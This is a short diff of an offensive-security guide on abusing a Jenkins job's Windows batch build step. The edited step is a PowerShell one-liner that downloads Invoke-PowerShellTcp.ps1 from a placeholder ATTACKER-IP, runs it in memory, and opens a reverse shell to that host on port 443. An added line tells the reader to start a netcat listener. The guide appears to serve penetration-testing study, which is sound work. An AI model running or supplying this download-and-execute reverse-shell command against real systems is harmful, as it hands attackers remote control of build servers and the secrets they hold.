@@ -104,13 +104,12 @@ println "out> $sout err> $serr"
 - Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:
 
 ```
-powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -R
+powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443
 ```
 
+- Now we can go ahead and start up a listener with netcat using the `netcat.exe` version
 
-```
-powershell -c <command>
-```
+
  
 - Again, you could download and execute scripts, run encoded scripts and more.
 
